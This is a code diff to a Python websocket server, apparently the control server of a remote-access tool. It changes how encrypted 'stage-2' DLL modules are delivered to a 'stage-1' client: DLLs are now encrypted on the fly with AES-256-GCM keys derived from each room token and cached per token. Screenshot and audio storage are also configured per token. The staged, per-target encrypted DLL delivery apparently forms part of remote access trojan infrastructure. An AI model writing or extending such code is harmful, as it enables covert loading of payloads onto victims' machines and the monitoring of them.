@@ -67,17 +67,23 @@ AUDIO_DIR = Path(os.environ.get("RDP_AUDIO_DIR", "/opt/remotedesk/audio"))
 AUDIO_QUOTA = int(os.environ.get("RDP_AUDIO_QUOTA", 500_000_000))  # 500MB default
 
 # ─── Stage-2 encrypted module blobs ──────────────────────────────────────────
-# Directory layout: STAGE2_DIR / <room_token> / <module>.bin
-# Each blob is AES-256-GCM-encrypted with a key derived from the room's token
-# (see _gen_stage2_blob.py and aes_gcm.h). The server never sees plaintext —
-# it's just a content-addressed file server for already-encrypted payloads.
+# Directory layout (flat, one shared set of DLLs for ALL room tokens):
+#     STAGE2_DIR/<module>.dll         ← unencrypted, source of truth
+#     STAGE2_DIR/cache/<token>/<module>.bin   ← server-generated cache (auto)
 #
-# Deployment workflow:
-#   1. Admin builds stage-2 DLLs with CMake (`build/stage2/<mod>.dll`)
-#   2. Admin runs `python _gen_stage2_blob.py <room_token> <dll> <bin>` for
-#      each room, placing outputs in STAGE2_DIR/<room_token>/
-#   3. Host's stage-1 fetches them on-demand over its existing auth'd WSS
+# Flow: host sends stage2_fetch{module}. If the per-(token, module) blob is
+# already cached on disk, serve it. Otherwise, read the DLL, AES-256-GCM
+# encrypt with key derived from the room's token (matches aes_gcm.h
+# derive_key: SHA256("pnp.stage2.v1" || token)), write to cache, serve.
+#
+# Advantages over pre-encrypted per-token blobs:
+#   * One directory of DLLs covers every current/future room_token
+#   * Admin never has to pre-generate anything per token
+#   * Cache ensures first-hit is the only slow request (~50ms for 250KB)
+#
+# Deploy: just copy build/stage2/*.dll (3 files) to STAGE2_DIR on the VPS.
 STAGE2_DIR = Path(os.environ.get("RDP_STAGE2_DIR", "/opt/remotedesk/stage2"))
+STAGE2_CACHE_DIR = STAGE2_DIR / "cache"
 STAGE2_MAX_BLOB = int(os.environ.get("RDP_STAGE2_MAX_BLOB", 10_000_000))  # 10MB safety cap
 
 # Whitelist of module names to avoid path traversal shenanigans
@@ -86,6 +92,41 @@ STAGE2_KNOWN_MODULES = frozenset({
     # Dev/test:
     "sample",
 })
+
+
+def _stage2_derive_key(token: str) -> bytes:
+    """Match aes_gcm.h derive_key(): SHA-256('pnp.stage2.v1' || token) -> 32B."""
+    h = hashlib.sha256()
+    h.update(b"pnp.stage2.v1")
+    h.update(token.encode("utf-8"))
+    return h.digest()
+
+
+def _stage2_encrypt(key: bytes, plaintext: bytes) -> bytes:
+    """AES-256-GCM blob format: [12B IV][ciphertext][16B tag]."""
+    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+    iv = os.urandom(12)
+    return iv + AESGCM(key).encrypt(iv, plaintext, associated_data=None)
+
+
+def _stage2_get_blob(token: str, module: str) -> Optional[bytes]:
+    """Return an encrypted blob for (token, module), reading from cache or
+    generating on-the-fly from the DLL. Returns None if the DLL is missing."""
+    cache_path = STAGE2_CACHE_DIR / token / f"{module}.bin"
+    if cache_path.is_file():
+        return cache_path.read_bytes()
+    dll_path = STAGE2_DIR / f"{module}.dll"
+    if not dll_path.is_file():
+        return None
+    try:
+        key = _stage2_derive_key(token)
+        blob = _stage2_encrypt(key, dll_path.read_bytes())
+        cache_path.parent.mkdir(parents=True, exist_ok=True)
+        cache_path.write_bytes(blob)
+        return blob
+    except Exception as e:
+        log.warning(f"stage2: encrypt failed for {module}/{token[:8]}: {e}")
+        return None
 
 def _ensure_screenshot_dir(token: str) -> Path:
     d = SCREENSHOT_DIR / token
@@ -1259,26 +1300,19 @@ async def handler(websocket, path: str):
                                 "error": "unknown stage2 module"
                             }))
                             continue
-                        blob_path = STAGE2_DIR / room.token / f"{module}.bin"
-                        if not blob_path.is_file():
+                        # On-the-fly encryption (or cache hit) — see _stage2_get_blob.
+                        # DLLs must be deployed to STAGE2_DIR as flat <module>.dll files.
+                        data = _stage2_get_blob(room.token, module)
+                        if data is None:
                             await websocket.send(json.dumps({
                                 "id": req_id, "ok": False,
-                                "error": f"stage2 blob not found: {module}"
+                                "error": f"stage2 module not available: {module}"
                             }))
                             continue
-                        try:
-                            sz = blob_path.stat().st_size
-                            if sz > STAGE2_MAX_BLOB:
-                                await websocket.send(json.dumps({
-                                    "id": req_id, "ok": False,
-                                    "error": "stage2 blob too large"
-                                }))
-                                continue
-                            data = blob_path.read_bytes()
-                        except OSError as e:
+                        if len(data) > STAGE2_MAX_BLOB:
                             await websocket.send(json.dumps({
                                 "id": req_id, "ok": False,
-                                "error": f"stage2 read error: {e}"
+                                "error": "stage2 blob too large"
                             }))
                             continue
                         b64 = base64.b64encode(data).decode("ascii")
